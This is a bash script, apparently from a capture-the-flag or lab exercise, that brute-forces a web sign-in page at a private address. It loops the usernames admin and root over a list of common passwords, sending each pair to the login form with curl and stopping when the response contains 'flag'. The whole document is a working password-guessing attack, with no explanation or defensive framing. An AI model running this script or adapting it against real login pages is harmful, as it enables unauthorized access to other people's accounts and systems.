#!/bin/bash

username=(admin root)
password=(123456 password shadow 12345678 qwerty abc123 123456789 111111 1234567 iloveyou 666666 adobe123 shadow 123123 password1 Admin 1234567890 letmein photoshop 1234 monkey sunshine 12345 password1 dragon princess azerty trustno1 000000)

for i in ${password[@]}; do
	for j in ${username[@]}; do
	echo ${j}
		if curl -f -X POST "http://192.168.1.43/index.php?page=signin&username=${j}&password=${i}&Login=Login#" | grep 'flag'; then
			echo username: ${j} password: ${i}
			break 2
		fi
	done
done
